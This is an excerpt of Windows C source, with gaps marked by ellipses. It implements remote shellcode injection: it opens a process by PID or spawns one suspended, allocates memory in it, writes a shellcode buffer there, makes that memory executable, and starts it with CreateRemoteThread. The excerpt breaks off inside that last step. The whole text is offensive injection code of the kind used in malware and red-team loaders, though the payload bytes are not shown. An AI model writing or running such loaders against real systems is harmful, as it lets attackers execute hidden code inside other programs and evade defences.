...
int main(int argc, char * argv[]) {
    ...
    if (argc > 1) {
        DWORD procPid = (DWORD) atoi(argv[1]);
        if (procPid == 0) {
            cmdline = argv[1];
        }
        else {
    ...
    if (hProcess == INVALID_HANDLE_VALUE) {
        // rcx, rdx, r8, r9 -> 4 stack allocation -> rest on stack after the 4 stack allocation
        CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo);
        hProcess = pinfo.hProcess;
    }

    if (hProcess) {
        LPVOID addressPointer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (addressPointer) {
            if (WriteProcessMemory(hProcess, addressPointer, shellcode, sizeof(shellcode), 0)) {
                DWORD flOldProtect = 0;
                if (VirtualProtectEx(hProcess, addressPointer, sizeof(addressPointer), PAGE_EXECUTE, &flOldProtect)) {
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
                    if (hThread) {
